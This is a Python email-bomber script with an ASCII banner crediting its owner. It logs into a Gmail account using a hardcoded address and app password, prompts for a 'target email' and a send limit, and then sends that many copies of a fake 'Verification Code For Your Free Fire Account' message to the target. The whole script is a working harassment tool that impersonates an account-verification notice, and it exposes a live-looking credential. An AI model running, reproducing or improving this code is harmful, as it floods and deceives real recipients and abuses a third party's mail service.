import smtplib


import os








os.system("clear")
 #Raw string to avoid unicode issues
print("""\033[33m
▗▄▄▄▖▗▖  ▗▖ ▗▄▖ ▗▄▄▄▖▗▖   
▐▌   ▐▛▚▞▜▌▐▌ ▐▌  █  ▐▌   
▐▛▀▀▘▐▌  ▐▌▐▛▀▜▌  █  ▐▌   
▐▙▄▄▖▐▌  ▐▌▐▌ ▐▌▗▄█▄▖▐▙▄▄▖
                          
                          
\033[00m
\033[34m====================================
\033[32mOwner      : MD YOUSUFJISAN
GitHub     : MD YOUSUFJISAN
Facebook   : MD YOUSUFJISAN
\033[34m====================================\033[32m
""")
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

server.login("jisa1181n@gmail.com", "wspluqnjhgkreety") 

me = input("Enter your target email: ")
limit = int(input("Enter your limit: "))

msg = "Subject: Verification Code For Your Free Fire Account\n\nDear user,\nYou have requested a verification code."

for i in range(limit):
    server.sendmail("jisa1181n@gmail.com", me, msg)
    print(f"\n\n\033[1;32m{i+1}. Email Sent Successfully\033[1;m")

server.quit()